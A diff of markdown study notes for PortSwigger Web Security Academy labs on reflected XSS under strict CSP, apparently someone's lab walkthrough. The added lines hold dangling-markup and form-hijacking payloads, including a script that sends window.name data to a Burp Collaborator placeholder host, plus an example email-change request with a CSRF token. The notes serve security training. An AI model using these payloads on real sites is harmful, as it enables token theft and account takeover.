@@ -2590,19 +2590,31 @@ Content-Type: application/json
   
 **Content security policy (CSP)**
 - Reflected XSS protected by very **strict CSP**, with **dangling markup attack**
+  - Burp steps not working: follow https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/
   - Email param is vulnerable to XSS
-  - Exploit server
-    `<script> if(window.name) { new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?' encodeURIComponent(window.name); } else { location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email="><a href="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</a><base target=''; } </script>`
     ```
-    <script> if(window.name) { 
-                new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name); } 
-             else {
-                location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27'; 
-              }
-    </script>
+    POST /my-account/change-email
+    
+    email=wiener2@normal-user.net&csrf=64TfvyvxkIXaSwO9JAPMDpEHBPMaqll4
+    ```
+  - Exploit server  
+    ```
+   Burp
+   <script>
+	if(window.name) {
+			new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
+			} else {
+	     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
+	}
+   </script>
+
+   Solution
+   <script>
+	location='https://YOUR-LAB-ID.web-security-academy.net/my-account?email="></form><form class="login_form" name="myform" action="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" method="GET"><button class="button" type="submit">Click</button';
+   </script>
     ```
   - copy the CSRF token from 'Poll Now'
-  - Generate CSRF OoC and replace the CSRF token
+  - Generate CSRF PoC and replace the CSRF token
 - Reflected XSS protected by CSP, with **CSP bypass**
   - The injection uses the `script-src-elem` directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts.   - Observe the response
     ```
